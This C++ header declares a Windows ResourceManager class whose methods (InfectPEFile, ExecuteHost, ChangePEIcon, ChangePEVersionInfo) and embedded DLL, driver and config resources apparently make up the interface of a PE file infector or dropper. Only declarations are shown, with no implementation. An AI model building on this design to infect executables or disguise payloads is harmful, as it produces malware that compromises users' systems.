#pragma once
#include <Windows.h>
#include <tchar.h>
#include "Utility.h"

class ResourceManager {
public:
	ResourceManager();
	bool SetResource(ULONG resId, PBYTE pRes, size_t size, TCHAR *type, TCHAR *path = nullptr);
	bool GetResource(ULONG resId, BinaryData &bin, TCHAR *type, TCHAR *path = nullptr);
	ULONG GetConfigId();
	ULONG GetSysId(size_t n);
	ULONG GetDllId(size_t n);
	bool InfectPEFile(TCHAR *host, TCHAR *dst, size_t mode = 0);
	bool ExecuteHost(ULONG idHostFile, LPCTSTR szCmdLine, int iCmdShow);
	bool ChangePEVersionInfo(TCHAR *src, TCHAR *dst);
	bool ChangePEIcon(LPCTSTR strSource, LPCTSTR strDest);
	void SetResourceId(ULONG exeFileHost, ULONG configResc, ULONG exeIcon, size_t ndllResc, PULONG dllResc, size_t nsysResc, PULONG sysResc);
private:
	TCHAR TempPath[MAX_PATH];
	ULONG InfectionMode;
	ULONG ExeFileHost;
	ULONG ExeIcon;
	ULONG ConfigResc;
	ULONG DllResc[8];
	ULONG SysResc[8];
	size_t nDllResc;
	size_t nSysResc;
	bool set_resource(ULONG resource_id, PBYTE data, size_t size, TCHAR *type, TCHAR *filepath = nullptr);
	bool get_resource(ULONG resource_id, BinaryData &buffer, TCHAR *type, TCHAR *filepath = nullptr);
};